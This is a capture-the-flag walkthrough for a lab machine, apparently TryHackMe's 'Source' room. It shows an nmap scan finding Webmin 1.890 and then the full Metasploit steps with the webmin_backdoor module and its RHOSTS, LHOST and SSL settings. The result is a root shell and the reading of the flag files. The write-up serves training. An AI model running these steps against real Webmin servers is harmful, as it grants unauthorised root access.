# Source

author : R4yan/@R4yDev

first i started doing a nmap scan but not aggressive using the -T4 option

```
# Nmap 7.80 scan initiated Tue Sep  1 14:16:52 2020 as: nmap -sC -sV -oN nmap/scan -T4 10.10.223.83
Nmap scan report for 10.10.223.83
Host is up (2.0s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  1 14:17:48 2020 -- 1 IP address (1 host up) scanned in 56.12 seconds
```
then i opened the browser and went to http://$IP:10000 and i found an error

![](https://i.imgur.com/WMGYYfK.png)

to fix this just change **http** to **https**

after i changed the protocol i got a login form

![](https://i.imgur.com/WYyafmO.png)

i searched an exploit for webmin 1.890 (the version was found in the nmap scan) and i found [this](https://www.exploit-db.com/exploits/47230) that requires metasploit, so start metasploit with ```msfconsole```
and search the exploit

![](https://i.imgur.com/3Xprvye.png)

the exploit is : **linux/http/webmin_backdoor**

set the RHSOTS option with the ip of the machine
```
set RHOSTS $IP
```
then get your local ip address by running ```ip addr``` and set it as LHOST
```
set LHOST $LIP
```
and before you run the exploit don't forget to set SSL option to true
```
set SSL true
```
now run the epxloit
```
exploit
```
and you got root shell, yea no need to priv esc
```
whoami
root
```
get user flag
```
ls /home
dark
cat /home/dark/user.txt
THM{S****************E}
```
get root flag
```
cat /root/root.txt
THM{U**************L}
```


